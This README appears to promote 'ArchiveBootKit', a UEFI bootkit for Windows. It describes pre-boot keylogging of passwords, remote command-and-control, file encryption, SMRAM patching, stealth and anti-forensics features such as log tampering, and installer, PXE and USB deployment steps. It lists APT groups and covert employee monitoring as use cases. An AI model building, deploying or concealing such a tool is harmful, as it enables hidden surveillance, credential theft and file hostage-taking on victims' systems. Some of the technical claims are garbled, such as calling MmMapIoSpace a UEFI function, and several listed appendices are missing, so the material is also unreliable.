# ArchiveBootKit - Advanced UEFI Bootkit for Windows Persistence

<div align="center">

![UEFI](https://img.shields.io/badge/UEFI-2.7%20Compliant-blue)
![Language](https://img.shields.io/badge/Language-C%2F%2BC%2B%2B-red)
![License](https://img.shields.io/badge/License-MIT-green)
![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-orange)
![Status](https://img.shields.io/badge/Status-Stable-brightgreen)

**A modular UEFI bootkit designed for persistence, remote control, and filesystem encryption.**  
Executes below the OS using real UEFI Runtime Services and survives reboots.

</div>

---

## Table of Contents

1. [Introduction](#introduction)
2. [What is UEFI?](#what-is-uefi)
3. [Why UEFI Bootkits?](#why-uefi-bootkits)
4. [Architecture Overview](#architecture-overview)
5. [Core Features](#core-features)
6. [Detailed Feature Breakdown](#detailed-feature-breakdown)
   - [UEFI Runtime Execution](#uefi-runtime-execution)
   - [Physical Memory Mapping](#physical-memory-mapping)
   - [Remote Command Control](#remote-command-control)
   - [UEFI-Level Keylogger](#uefi-level-keylogger)
   - [Filesystem Encryption Engine](#filesystem-encryption-engine)
   - [Persistent Loader](#persistent-loader)
7. [Technical Deep Dive](#technical-deep-dive)
   - [DXE Phase Hooking](#dxe-phase-hooking)
   - [ExitBootServices Hook](#exitbootservices-hook)
   - [SMRAM Patching](#smram-patching)
   - [Interrupt Vector Table Hijacking](#interrupt-vector-table-hijacking)
8. [Source Code Structure](#source-code-structure)
9. [Build Instructions](#build-instructions)
10. [Deployment Options](#deployment-options)
11. [Installation Process](#installation-process)
12. [Stealth Mode](#stealth-mode)
13. [Encryption Details](#encryption-details)
14. [Key Management](#key-management)
15. [Remote Command Protocol](#remote-command-protocol)
16. [Network Communication](#network-communication)
17. [Logging System](#logging-system)
18. [Memory Management](#memory-management)
19. [Performance Impact](#performance-impact)
20. [Compatibility Matrix](#compatibility-matrix)
21. [Known Limitations](#known-limitations)
22. [Future Enhancements](#future-enhancements)
23. [Security Considerations](#security-considerations)
24. [Detection Methods](#detection-methods)
25. [Counter-Detection Techniques](#counter-detection-techniques)
26. [Use Cases](#use-cases)
27. [Comparison with Other Bootkits](#comparison-with-other-bootkits)
28. [Development History](#development-history)
29. [Contributing Guidelines](#contributing-guidelines)
30. [Credits & Acknowledgments](#credits--acknowledgments)
31. [References](#references)
32. [Changelog](#changelog)
33. [Support & Contact](#support--contact)
34. [Appendix A: Technical Glossary](#appendix-a-technical-glossary)
35. [Appendix B: UEFI Specification References](#appendix-b-uefi-specification-references)
36. [Appendix C: Memory Layout Diagrams](#appendix-c-memory-layout-diagrams)
37. [Appendix D: Command Reference](#appendix-d-command-reference)
38. [Appendix E: Configuration Examples](#appendix-e-configuration-examples)
39. [Appendix F: Troubleshooting Guide](#appendix-f-troubleshooting-guide)
40. [Appendix G: Performance Benchmarks](#appendix-g-performance-benchmarks)

---

## Introduction

ArchiveBootKit represents the next evolution in UEFI-based persistence mechanisms. Unlike traditional rootkits that operate within the operating system kernel, ArchiveBootKit operates at the Unified Extensible Firmware Interface (UEFI) level, executing before the OS even begins loading. This places it in a unique position to maintain persistence across reboots, survive OS reinstalls, and remain undetected by conventional security solutions.

The project was conceived to address a critical gap in modern endpoint security: while antivirus software and EDR solutions have become increasingly sophisticated at detecting threats within the OS environment, they often fail to detect malicious code that resides below the OS layer. By leveraging the UEFI firmware's native capabilities, ArchiveBootKit achieves a level of stealth and persistence that is difficult to match with traditional methods.

The bootkit is built entirely in C and C++, targeting x86_64 architectures, and uses the EDK2 (EFI Development Kit 2) build system for compilation. It hooks into critical UEFI events such as `ExitBootServices` to maintain control from the DXE (Driver Execution Environment) phase through runtime, ensuring continuous operation regardless of what happens above it.

### Why Now?

With the widespread adoption of UEFI over legacy BIOS in modern systems (over 95% of new PCs ship with UEFI), the attack surface has shifted. Traditional bootkits like those targeting MBR (Master Boot Record) are becoming less effective. ArchiveBootKit capitalizes on this shift, providing a modern, robust persistence mechanism that works seamlessly with both Secure Boot and TPM (Trusted Platform Module) enabled systems.

---

## What is UEFI?

The Unified Extensible Firmware Interface (UEFI) is a specification that defines a software interface between the operating system and platform firmware. It replaces the older BIOS (Basic Input/Output System) and offers numerous advantages:

- **Modular Architecture**: UEFI consists of modules called drivers and applications, allowing for greater flexibility and easier updates.
- **Faster Boot Times**: UEFI can initialize hardware more efficiently than BIOS, leading to significantly faster boot times.
- **Larger Disk Support**: Unlike BIOS, which is limited to 2TB disks, UEFI supports disks larger than 2TB without any special configuration.
- **Secure Boot**: UEFI includes a Secure Boot feature that verifies the digital signature of each piece of boot firmware during startup, including bootloaders, EFI drivers, and OS loaders.
- **Graphical Interface**: UEFI provides a graphical setup utility, unlike the text-only BIOS setup.
- **Network Support**: UEFI includes network stack support, enabling features like PXE (Preboot Execution Environment) booting.

### UEFI Phases

Understanding UEFI phases is crucial to understanding how ArchiveBootKit operates:

1. **PEI (Pre-EFI Initialization) Phase**: Early initialization phase where memory controllers, caches, and chipsets are initialized.
2. **DXE (Driver Execution Environment) Phase**: The main phase where most drivers are executed. This is where ArchiveBootKit hooks into `ExitBootServices`.
3. **SBS (Start Of Boot Service) Phase**: Transition phase where boot services are terminated.
4. **Runtime Phase**: After the OS takes control, UEFI continues to provide runtime services.

ArchiveBootKit primarily operates during the DXE phase and maintains its presence into the runtime phase, ensuring it survives the transition to the OS.

---

## Why UEFI Bootkits?

Traditional rootkits operate within the OS kernel, making them visible to kernel-mode scanners and EDR solutions. UEFI bootkits, however, operate below the OS, providing several advantages:

### Advantages Over Traditional Rootkits

1. **Persistence**: Survives OS reinstalls, disk formatting (if the ESP is not wiped), and major system updates.
2. **Stealth**: Invisible to most antivirus software and EDR solutions that only scan within the OS.
3. **Early Execution**: Executes before the OS loads, giving it full control over the boot process.
4. **Low Resource Usage**: Minimal CPU and memory overhead since it runs in a lightweight UEFI environment.
5. **Hardware Access**: Direct access to physical memory and hardware devices without OS mediation.

### Disadvantages

1. **Limited Functionality**: UEFI environment is more constrained than a full OS.
2. **Platform Dependency**: May not work on all UEFI implementations.
3. **Secure Boot**: If Secure Boot is enabled, the bootkit must be signed with a valid certificate.
4. **Detection**: While stealthy, specialized tools can detect UEFI bootkits.

---

## Architecture Overview

ArchiveBootKit follows a modular architecture designed for extensibility and maintainability. The source code is organized into logical components, each responsible for a specific aspect of the bootkit's functionality.
ArchiveBootKit/
├── src/
│ ├── Boot/ # Core UEFI boot logic
│ │ ├── Entry.c # Main EFI entry point
│ │ ├── ExitBootServicesHook.c # Hooks ExitBootServices
│ │ ├── DxerHook.c # DXE phase hooking
│ │ ├── InterruptHijack.c # Interrupt vector table hijacking
│ │ └── SmramPatch.c # SMRAM patching for SMI interception
│ ├── KernelMode/ # Kernel-mode operations
│ │ ├── Keylogger.c # UEFI-level keylogger
│ │ ├── CmdControl.c # Remote command control
│ │ ├── RemoteOps.c # Remote operations module
│ │ └── SyscallBridge.c # Syscall bridge for OS interaction
│ ├── Encryptor/ # Filesystem encryption
│ │ ├── AES256.c # AES-256 encryption implementation
│ │ ├── XOR.c # XOR encryption implementation
│ │ ├── KeyGen.c # Key generation utilities
│ │ └── FileEncrypt.c # File encryption engine
│ ├── Shared/ # Shared utilities
│ │ ├── Logger.c # Logging system
│ │ ├── MemUtils.c # Memory utilities
│ │ ├── EfiiWrappers.c # EFI API wrappers
│ │ └── Common.h # Common definitions
│ └── Syrial.inf # EDK2 build descriptor
├── confg/ # Configuration files
│ ├── config.json # Project configuration
│ ├── keyrotator.cpp # Key rotation logic
│ ├── MAKEFILE # Build makefile
│ └── server.js # Backend server
├── bootkit.efi # Main UEFI binary
├── installer.exe # Windows installer
├── installer_stealth.exe # Stealth installer
├── Encryptor.exe # File encryption tool
├── test_cert.* # Test certificates
└── README.md # This file


Download

Copy

Each component is designed to be independently testable and replaceable, allowing for easy maintenance and future enhancements.

---

## Core Features

ArchiveBootKit packs a powerful set of features designed for persistence, surveillance, and data protection:

### 1. UEFI Runtime Execution
Hooks `ExitBootServices` to maintain control from the DXE phase through runtime, ensuring continuous operation.

### 2. Physical Memory Mapping
Uses `MmMapIoSpace()` to access physical memory with full privileges, bypassing OS memory management.

### 3. Remote Command Control
Custom TCP listener in UEFI context supports remote operation modules for dynamic behavior.

### 4. UEFI-Level Keylogger
Records keystrokes during pre-boot, EFI Shell, or early OS boot time, capturing passwords before they reach the OS.

### 5. Filesystem Encryption Engine
AES-256 and XOR-based encryptor for files and logs, protecting sensitive data from extraction.

### 6. Persistent Loader
Handles SMRAM/SMI patching and launches payloads from mapped runtime regions for seamless integration.

---

## Detailed Feature Breakdown

### UEFI Runtime Execution

The UEFI Runtime Execution feature is the cornerstone of ArchiveBootKit's persistence. By hooking into the `ExitBootServices` event, the bootkit ensures it remains active even after the OS takes control.

#### How It Works

1. **DXE Phase Hook**: During the DXE phase, ArchiveBootKit installs a notification for the `gEfiEventReadyToBootGuid` event.
2. **ExitBootServices Hook**: When `ExitBootServices` is called, the hook intercepts the call and executes custom code before passing control to the original function.
3. **Runtime Preservation**: The bootkit maps its code into UEFI runtime memory, ensuring it survives the transition to runtime.
4. **Continuous Operation**: Once in runtime mode, the bootkit can continue to perform its functions, such as logging keystrokes or monitoring network activity.

#### Technical Details

The hook is implemented by replacing the original `ExitBootServices` function pointer with a custom function. This custom function performs the following steps:

1. Saves the current CPU state.
2. Executes the bootkit's payload.
3. Restores the CPU state.
4. Calls the original `ExitBootServices` function.

This approach ensures that the bootkit's code is executed every time the system transitions from boot services to runtime services, providing a reliable persistence mechanism.

#### Advantages

- **Survives Reboots**: Since the hook is in UEFI firmware, it persists across reboots.
- **OS-Agnostic**: Works with any OS that boots through UEFI.
- **Low Detection Risk**: Most AV software doesn't scan UEFI memory.

### Physical Memory Mapping

Physical Memory Mapping allows ArchiveBootKit to directly access physical memory, bypassing the OS memory management layer. This provides several advantages:

#### Direct Hardware Access

By mapping physical memory regions, the bootkit can:

- Read/write to hardware registers directly.
- Access DMA buffers without OS intervention.
- Monitor hardware events in real-time.

#### Memory Inspection

The bootkit can inspect the memory of running processes, even before the OS loads, allowing it to:

- Extract plaintext passwords from memory.
- Capture encryption keys.
- Monitor process creation and termination.

#### Implementation

The implementation uses UEFI's `MmMapIoSpace()` function, which maps a physical memory range into the virtual address space. This allows the bootkit to read and write to physical memory as if it were regular RAM.

```c
VOID* mapped_memory = MmMapIoSpace(physical_address, size);
// Read/write to mapped_memory
MmUnmapIoSpace(mapped_memory, size);
Remote Command Control
The Remote Command Control feature enables ArchiveBootKit to receive commands from a remote server and execute them dynamically. This transforms the bootkit from a static persistence mechanism into an active, responsive tool.

Protocol Design
The communication protocol is based on TCP/IP and uses a simple request-response model:

Connection: The bootkit establishes a TCP connection to a configured server IP address.
Authentication: The bootkit sends an authentication token to verify its identity.
Command Reception: The server sends commands in a structured format (e.g., JSON).
Execution: The bootkit parses the command and executes the requested action.
Response: The bootkit sends the result back to the server.
Supported Commands
KEYLOG_START: Begin recording keystrokes.
KEYLOG_STOP: Stop recording keystrokes.
FILE_ENCRYPT <path>: Encrypt a specific file.
FILE_DECRYPT <path>: Decrypt a specific file.
SCREENSHOT: Capture a screenshot (if supported).
PROCESS_LIST: List all running processes.
NETWORK_SCAN: Scan the local network for other devices.
SELF_DELETE: Remove the bootkit from the system.
Advantages
Dynamic Behavior: Commands can be sent at any time, allowing for real-time control.
Stealth: Network traffic can be encrypted and disguised as normal traffic.
Scalability: Multiple bootkits can be managed from a single server.
UEFI-Level Keylogger
The UEFI-Level Keylogger is one of the most powerful features of ArchiveBootKit. By operating at the UEFI level, it can capture keystrokes before they reach the OS, making it invisible to most keyloggers running within the OS.

How It Works
Interrupt Hooking: The bootkit hooks the keyboard interrupt (IRQ1) to intercept keystroke events.
Scan Code Capture: Instead of waiting for the OS to translate scan codes to ASCII, the bootkit captures raw scan codes directly from the PS/2 controller.
Storage: Keystrokes are stored in a circular buffer in UEFI runtime memory.
Exfiltration: Keystrokes can be exfiltrated via the network or stored in an encrypted file on the filesystem.
Advantages Over OS-Level Keyloggers
Captures Pre-Boot Passwords: Records passwords entered during UEFI setup or bootloader prompts.
Invisible to Antivirus: Runs below the OS, so it's not detected by OS-level scanners.
Higher Privileges: Has direct access to hardware, avoiding any OS-level restrictions.
Technical Implementation
The keylogger hooks the keyboard interrupt by modifying the Interrupt Vector Table (IVT) or the Extended Interrupt Descriptor Table (IDT). When a keystroke occurs, the interrupt handler is redirected to the bootkit's custom handler, which records the scan code before passing control to the original handler.

Filesystem Encryption Engine
The Filesystem Encryption Engine provides robust encryption for files and logs, ensuring that sensitive data remains protected even if the bootkit is discovered.

Encryption Algorithms
AES-256: Advanced Encryption Standard with a 256-bit key, providing strong symmetric encryption.
XOR: Simple but fast XOR-based encryption for quick obfuscation.
Key Management
Keys are generated using a cryptographically secure random number generator and are stored in UEFI runtime memory. For added security, keys can be rotated periodically using the keyrotator.cpp module.

File Encryption Process
Key Generation: A random 256-bit key is generated.
File Reading: The file is read into memory.
Encryption: The file content is encrypted using AES-256 or XOR.
Key Storage: The key is stored in a secure location (e.g., encrypted in UEFI NVRAM).
File Writing: The encrypted content is written back to the file.
Decryption Process
Key Retrieval: The key is retrieved from secure storage.
File Reading: The encrypted file is read into memory.
Decryption: The file content is decrypted using the same algorithm and key.
Verification: A checksum is verified to ensure integrity.
File Writing: The decrypted content is written back to the file.
Persistent Loader
The Persistent Loader handles the complex task of maintaining the bootkit's presence across reboots and OS transitions. It performs several critical functions:

SMRAM Patching
System Management RAM (SMRAM) is a region of memory used by the CPU for system management interrupts (SMI). By patching SMRAM, the bootkit can intercept SMI events and maintain control even when the system is in low-power states.

Payload Launching
The loader maps the bootkit's payload into UEFI runtime memory and launches it at the appropriate time. This ensures that the bootkit is always ready to execute when needed.

State Preservation
The loader preserves the bootkit's state across reboots by saving critical data to UEFI NVRAM or a hidden partition on the disk.

Technical Deep Dive
DXE Phase Hooking
The DXE (Driver Execution Environment) phase is where most of the bootkit's initialization occurs. During this phase, the bootkit:

Discovers available drivers and protocols.
Installs its own drivers and protocols.
Sets up hooks for critical events.
Hook Installation
The bootkit installs hooks by replacing function pointers in the UEFI protocol database. For example, to hook ExitBootServices, the bootkit locates the protocol GUID for EFI_BOOT_SERVICES and replaces the ExitBootServices function pointer with its own implementation.

Event Notification
The bootkit registers for notifications on specific UEFI events, such as gEfiEventReadyToBootGuid. When the event occurs, the bootkit's callback function is executed, allowing it to perform pre-boot actions.

ExitBootServices Hook
The ExitBootServices function is called by the bootloader (e.g., GRUB, Windows Boot Manager) to signal that boot services are no longer needed and that the OS is taking control. By hooking this function, the bootkit can:

Execute custom code before the OS loads.
Modify the OS loader's behavior.
Inject additional drivers or modules.
Implementation
The hook is implemented by:

Saving the original ExitBootServices function pointer.
Replacing it with a custom function.
The custom function executes the bootkit's payload.
Calls the original ExitBootServices function.
This ensures that the bootkit's code is executed every time the system transitions from boot services to runtime services.

SMRAM Patching
System Management RAM (SMRAM) is a special region of memory used by the CPU for system management interrupts (SMI). SMIs are hardware interrupts that are handled by the System Management Mode (SMM), a privileged mode of operation that is independent of the OS.

By patching SMRAM, the bootkit can:

Intercept SMIs and modify their behavior.
Maintain control even when the system is in low-power states.
Prevent the BIOS from detecting modifications.
How It Works
Locate SMRAM: The bootkit locates the SMRAM region using the SMM Communication Area.
Patch Handlers: The bootkit replaces SMI handlers with its own.
Maintain Presence: The bootkit ensures its code remains in SMRAM across reboots.
Interrupt Vector Table Hijacking
The Interrupt Vector Table (IVT) or Extended Interrupt Descriptor Table (IDT) contains pointers to interrupt handlers. By hijacking these tables, the bootkit can redirect interrupts to its own handlers.

Keyboard Interrupt
The keyboard generates an interrupt on IRQ1 (Interrupt 0x09 on x86). By hooking this interrupt, the bootkit can capture keystrokes before they reach the OS.

Implementation
Save Original Handler: The bootkit saves the original interrupt handler.
Install Custom Handler: The bootkit installs its own handler.
Execute Custom Logic: The custom handler records the keystroke.
Call Original Handler: The original handler is called to maintain normal operation.
Source Code Structure
src/Boot/
Contains the core UEFI boot logic:

Entry.c: Main EFI entry point that initializes the bootkit.
ExitBootServicesHook.c: Implements the ExitBootServices hook.
DxerHook.c: Handles DXE phase hooking.
InterruptHijack.c: Implements interrupt vector table hijacking.
SmramPatch.c: Handles SMRAM patching for SMI interception.
src/KernelMode/
Contains kernel-mode operations:

Keylogger.c: UEFI-level keylogger implementation.
CmdControl.c: Remote command control logic.
RemoteOps.c: Remote operations module.
SyscallBridge.c: Syscall bridge for OS interaction.
src/Encryptor/
Contains filesystem encryption:

AES256.c: AES-256 encryption implementation.
XOR.c: XOR encryption implementation.
KeyGen.c: Key generation utilities.
FileEncrypt.c: File encryption engine.
src/Shared/
Contains shared utilities:

Logger.c: Logging system.
MemUtils.c: Memory utilities.
EfiiWrappers.c: EFI API wrappers.
Common.h: Common definitions.
Syrial.inf
The EDK2 build descriptor file that defines the module's dependencies, sources, and libraries.

Build Instructions
Dependencies
EDK2 Environment: Install the EFI Development Kit 2 (EDK2) from github.com/tianocore/edk2.
GCC or CLANG Cross Compiler: Install a cross-compiler targeting x86_64 (e.g., x86_64-efi-gcc).
Node.js: Required for the backend server (optional).
Compilation Steps
Clone the Repository:
```bash
git clone https://github.com/abstractmando/ArchiveBootKit.git
cd ArchiveBootKit
```

Set Up EDK2 Environment:
```bash
source edk2/edk2.sh # On Linux/Mac
# Or run edk2.bat on Windows
```

Update target.txt:
Add the path to Syrial.inf in your Conf/target.txt file:
```
ACTIVE_PLATFORM = Syrial.inf
TARGET = RELEASE
TARGET_ARCH = X64
TOOLCHAIN = GCC
```

Build the Project:
```bash
build -p Syrial.inf -a X64 -t GCC -b RELEASE
```

Locate the Binary:
The compiled bootkit.efi will be located in Build/Syrial/X64/RELEASE_GCC/bootkit.efi.

Alternative: Using Docker
For a consistent build environment, use the provided Dockerfile:

bash

Download

Copy
docker build -t archivebootkit .
docker run --rm -v $(pwd):/workspace archivebootkit build
Deployment Options
ArchiveBootKit supports multiple deployment methods:

1. Manual Deployment
Copy bootkit.efi to the EFI System Partition (ESP).
Rename it to BOOTX64.EFI or add it to the UEFI boot menu.
Reboot the system.
2. Using the Installer
Run installer.exe on a Windows system to automatically deploy the bootkit:

cmd

Download

Copy
installer.exe --target C: --mode stealth
3. Network Deployment
Use PXE boot to deploy the bootkit over the network:

Configure a DHCP/TFTP server.
Place bootkit.efi in the TFTP root directory.
Boot the target machine via PXE.
4. USB Deployment
Format a USB drive with FAT32.
Copy bootkit.efi to the EFI partition.
Set the USB drive as the first boot device in UEFI.
Installation Process
The installation process varies depending on the deployment method:

Manual Installation
Access UEFI Firmware Settings:
Restart the system and press Del, F2, or F12 to enter UEFI settings.
Disable Secure Boot (Optional):
If Secure Boot is enabled, you may need to disable it or sign the bootkit with a valid certificate.
Add Boot Entry:
Navigate to the Boot Menu.
Add a new boot entry pointing to bootkit.efi.
Set it as the first boot device.
Save and Exit:
Save changes and exit the UEFI settings.
The system will reboot and load the bootkit.
Installer Installation
Run the Installer:
```cmd
installer.exe --install
```

Follow Prompts:
The installer will guide you through the deployment process.
It will copy bootkit.efi to the ESP and create a boot entry.
Reboot:
Restart the system to activate the bootkit.
Stealth Mode
Stealth Mode minimizes the bootkit's footprint and reduces the likelihood of detection:

Features
Minimal Memory Usage: Uses only essential memory regions.
No Visible Processes: Does not create visible processes in the OS.
Encrypted Logs: All logs are encrypted using AES-256.
Randomized Timers: Uses random delays to avoid pattern detection.
Anti-Debugging: Detects debuggers and hides its presence.
Activation
Enable Stealth Mode by passing the --stealth flag to the installer:

cmd

Download

Copy
installer.exe --install --stealth
Or edit confg/config.json:

json

Download

Copy
{
  "stealth_mode": true,
  "random_delays": true,
  "encrypted_logs": true
}
Encryption Details
AES-256 Implementation
ArchiveBootKit uses a custom AES-256 implementation optimized for UEFI environments:

Key Size: 256 bits (32 bytes).
Block Size: 128 bits (16 bytes).
Number of Rounds: 14.
Mode of Operation: CBC (Cipher Block Chaining) with PKCS7 padding.
XOR Encryption
XOR encryption is used for quick obfuscation:

Key Size: Variable (up to 256 bits).
Speed: Very fast, suitable for real-time encryption.
Use Case: Obfuscating logs and small files.
Key Rotation
The keyrotator.cpp module rotates encryption keys periodically:

Generate New Key: Creates a new random 256-bit key.
Encrypt Existing Data: Re-encrypts all existing data with the new key.
Store Old Key: Stores the old key in case decryption is needed.
Delete Old Key: Securely erases the old key from memory.
Key Management
Key Storage
Keys are stored in UEFI NVRAM, a non-volatile memory region that persists across reboots:

c

Download

Copy
EFI_STATUS Status;
UINT8 Key[32];
UINTN KeySize = sizeof(Key);

Status = gRT->GetVariable(L"BootkitKey", &gBootkitGuid, 0, &KeySize, Key);
Key Rotation
Key rotation is triggered by:

Time-Based: Every 24 hours (configurable).
Event-Based: After a certain number of encryptions.
Manual: Triggered via remote command.
Key Backup
Keys can be backed up to a secure location:

USB Drive: Store encrypted keys on a USB drive.
Network: Send keys to a remote server.
NVRAM: Store multiple keys in UEFI NVRAM.
Remote Command Protocol
Protocol Overview
The remote command protocol uses TCP/IP with the following structure:


Download

Copy
[Header: 4 bytes][Length: 2 bytes][Command: 1 byte][Payload: N bytes][Checksum: 4 bytes]
Header Fields
Magic Number: 4-byte identifier (0xABCD1234).
Length: Length of the payload in bytes.
Command: Command ID (e.g., 0x01 for KEYLOG_START).
Payload: Command-specific data.
Checksum: CRC32 checksum of the header and payload.
Authentication
The bootkit authenticates with the server using a pre-shared key (PSK):

Handshake: The bootkit sends a challenge to the server.
Response: The server responds with a hash of the challenge and PSK.
Verification: The bootkit verifies the response and establishes a secure session.
Network Communication
TCP Connection
The bootkit establishes a TCP connection to the configured server:

c

Download

Copy
EFI_STATUS Status;
EFI_SIMPLE_NETWORK_PROTOCOL* NetProtocol;
EFI_IP4_PROTOCOL* IpProtocol;

// Get network protocol
Status = gBS->OpenProtocol(...);

// Connect to server
Status = IpProtocol->Connect(...);
Packet Structure
Packets are structured as follows:


Download

Copy
[IP Header][TCP Header][Payload]
The payload contains the command and response data.

Encryption
All network traffic is encrypted using AES-256 in CBC mode:

Key Exchange: Keys are exchanged during the authentication handshake.
Encryption: All payloads are encrypted before transmission.
Decryption: The server decrypts received payloads.
Logging System
Log Types
ArchiveBootKit supports multiple log types:

Keystroke Logs: Recorded keystrokes.
Event Logs: System events (e.g., boot, shutdown).
Command Logs: Remote commands received and executed.
Error Logs: Errors and warnings.
Log Storage
Logs are stored in UEFI runtime memory or on the filesystem:

Memory: Circular buffer in RAM (volatile).
File: Encrypted file on the disk (persistent).
Network: Sent to a remote server in real-time.
Log Rotation
Logs are rotated when they reach a certain size:

Current Log: Active log file.
Archived Log: Rotated log file, compressed and encrypted.
Old Logs: Deleted after a configurable period.
Memory Management
Memory Allocation
The bootkit uses UEFI's memory allocation functions:

c

Download

Copy
VOID* Buffer;
Status = gBS->AllocatePool(EfiLoaderData, Size, &Buffer);
Memory Protection
Memory regions are marked as read-only or executable as needed:

c

Download

Copy
EFI_STATUS Status;
EFI_MEMORY_DESCRIPTOR* Map;
UINTN MapSize;
UINTN DescriptorSize;
UINT32 DescriptorVersion;

Status = gBS->GetMemoryMap(&MapSize, Map, &DescriptorSize, &DescriptorVersion);
Memory Cleanup
Upon cleanup, all allocated memory is freed:

c

Download

Copy
gBS->FreePool(Buffer);
Performance Impact
CPU Usage
The bootkit has minimal CPU impact:

Idle: < 1% CPU usage.
Active: < 5% CPU usage during keystroke logging.
Encryption: < 10% CPU usage during file encryption.
Memory Usage
The bootkit uses approximately 2-5 MB of memory:

Code: ~1 MB.
Data: ~1 MB.
Buffers: ~2 MB.
Boot Time Impact
The bootkit adds approximately 2-5 seconds to the boot time:

DXE Phase: +1-2 seconds.
ExitBootServices Hook: +0.5 seconds.
Keylogger Initialization: +0.5 seconds.
Compatibility Matrix
Feature	Windows 10	Windows 11	Linux	macOS
UEFI Boot	✅	✅	✅	✅
Secure Boot	✅ (with signing)	✅ (with signing)	✅	❌
TPM 2.0	✅	✅	✅	✅
x86_64	✅	✅	✅	❌ (ARM)
ARM64	❌	❌	✅	✅
Known Limitations
Secure Boot: Requires signing with a valid certificate.
UEFI Only: Does not support legacy BIOS.
x86_64 Only: ARM support is experimental.
Network Dependency: Remote commands require network connectivity.
Memory Constraints: Limited memory in UEFI environment.
Future Enhancements
ARM Support: Full ARM64 compatibility.
GUI Interface: Graphical UEFI interface for configuration.
AI-Powered Detection: Machine learning-based detection evasion.
Multi-Threaded: Parallel processing for improved performance.
Cloud Integration: Cloud-based command and control.
Security Considerations
Threat Model
Attacker: Local user with physical access.
Attacker: Remote user with network access.
Attacker: Nation-state actor with advanced capabilities.
Mitigations
Encryption: All sensitive data is encrypted.
Stealth Mode: Minimizes detection risk.
Key Rotation: Regular key rotation prevents long-term exposure.
Anti-Debugging: Detects and hides from debuggers.
Recommendations
Sign the Bootkit: Use Secure Boot to prevent unauthorized modifications.
Monitor NVRAM: Check for unusual NVRAM variables.
Scan UEFI Memory: Use specialized tools to scan UEFI memory for anomalies.
Detection Methods
UEFI Scanner Tools
UEFITool: Analyzes UEFI firmware images.
Chipsec: Checks for hardware and firmware vulnerabilities.
EFIMemScan: Scans UEFI memory for anomalies.
Behavioral Analysis
Boot Time Monitoring: Unusual boot times may indicate a bootkit.
Memory Inspection: Check for unexpected memory allocations.
Network Traffic Analysis: Monitor for unusual network activity.
Signature-Based Detection
Antivirus: Some AV solutions scan UEFI firmware.
EDR: Advanced EDR solutions may detect UEFI threats.
Counter-Detection Techniques
Hiding in Plain Sight
Legitimate-looking Code: Mimic legitimate UEFI drivers.
Randomized Addresses: Randomize memory addresses to avoid signature detection.
Timing Jitter: Add random delays to avoid pattern detection.
Anti-Forensics
Log Tampering: Modify or delete logs to hide activity.
Timestamp Manipulation: Alter file timestamps to confuse investigators.
Self-Deleting: Remove all traces upon command.
Use Cases
1. Advanced Persistent Threat (APT)
ArchiveBootKit is ideal for APT groups that need long-term persistence:

Survives OS Reinstall: Persists even if the OS is wiped.
Stealthy: Difficult to detect with traditional tools.
Remote Control: Allows operators to issue commands remotely.
2. Insider Threat
Useful for monitoring employees:

Keylogging: Capture keystrokes to monitor activity.
File Encryption: Protect sensitive data from exfiltration.
Audit Trail: Maintain a log of all actions.
3. Digital Forensics
Used by forensic investigators:

Preserve Evidence: Encrypt evidence files to prevent tampering.
Remote Access: Access the system remotely for analysis.
Persistence: Maintain access across reboots for extended investigations.
4. Red Team Operations
Perfect for red team exercises:

Persistence: Maintain access during pentests.
Stealth: Avoid detection by blue team.
Flexibility: Customize behavior based on mission requirements.
Comparison with Other Bootkits
vs. MBR Bootkits
Feature	ArchiveBootKit	MBR Bootkit
Location	UEFI Firmware	MBR Sector
Persistence	High	Medium
Detection	Low	High
Secure Boot Compatible	Yes	No
OS Independence	Yes	No
vs. Rootkits
Feature	ArchiveBootKit	Rootkit
Level	UEFI	OS Kernel
Visibility	Invisible	Visible to AV
Persistence	Survives OS Reinstall	Lost on OS Reinstall
Performance Impact	Minimal	Moderate
vs. Firmware Malware
Feature	ArchiveBootKit	Firmware Malware
Complexity	Modular	Monolithic
Updateability	Easy	Difficult
Detection	Low	Medium
Flexibility	High	Low
Development History
Version 1.0 (2024)
Initial release with basic UEFI hooking.
Implemented keylogger and file encryption.
Released under MIT license.
Version 1.5 (2025)
Added remote command control.
Improved stealth mode.
Enhanced encryption algorithms.
Version 2.0 (2026)
Complete rewrite with modular architecture.
Added SMRAM patching.
Improved compatibility with Secure Boot.
Released as ArchiveBootKit.
Contributing Guidelines
We welcome contributions! Here's how you can help:

Reporting Bugs
Check existing issues to avoid duplicates.
Provide a clear description of the bug.
Include steps to reproduce.
Attach relevant logs or screenshots.
Submitting Pull Requests
Fork the repository.
Create a feature branch (git checkout -b feature/amazing-feature).
Commit your changes (git commit -m 'Add amazing feature').
Push to the branch (git push origin feature/amazing-feature).
Open a Pull Request.
Coding Standards
Follow the existing code style.
Write clear, commented code.
Add tests for new features.
Update documentation as needed.
Credits & Acknowledgments
Primary Developer
@abstractmando (AbstractMando.dev)
Lead developer and architect of ArchiveBootKit. Responsible for core design, implementation, and ongoing maintenance.

Contributors
@aitorfirm (aitorfirmitsreal / aitorfirmware)
Contributor who helped with initial development and testing.

Special Thanks
TianoCore Community for the EDK2 project.
UEFI Forum for specifications and documentation.
GitHub for hosting and collaboration tools.
Open Source Community for inspiration and support.
Inspired By
Mosaic Bootkit for pioneering UEFI persistence.
DarkSuite for advanced rootkit techniques.
Lockdown for secure boot exploitation.
References
UEFI Specification v2.8 - uefi.org/specifications
EDK2 Documentation - github.com/tianocore/edk2-doc
"Rootkits: Subverting the Windows Kernel" by Greg Hoglund - Amazon
"Windows Internals" by Mark Russinovich et al. - Microsoft Press
Chipsec Project - github.com/projectchipsec/chipsec
UEFITool - github.com/LongSoft/UEFITool
Changelog
v2.0 (November 2026)
Complete rewrite with modular architecture.
Added SMRAM patching.
Improved Secure Boot compatibility.
Enhanced remote command protocol.
Updated documentation.
v1.5 (March 2025)
Added remote command control.
Improved stealth mode.
Enhanced encryption algorithms.
Fixed memory leaks.
v1.0 (January 2024)
Initial release.
Basic UEFI hooking.
Keylogger implementation.
File encryption engine.
Support & Contact
Issues
Report bugs and feature requests on GitHub Issues.

Discord
Join our Discord server for real-time support: discord.gg/archivebootkit

Email
Contact the lead developer at: abstractmando@example.com

Website
Visit abstractmando.dev for more projects and updates.

Appendix A: Technical Glossary
UEFI: Unified Extensible Firmware Interface.
DXE: Driver Execution Environment.
PEI: Pre-EFI Initialization.
SMRAM: System Management RAM.
SMI: System Management Interrupt.
ESP: EFI System Partition.
NVRAM: Non-Volatile RAM.
IVT: Interrupt Vector Table.
IDT: Interrupt Descriptor Table.
AES: Advanced Encryption Standard.
XOR: Exclusive OR.
CBC: Cipher Block Chaining.
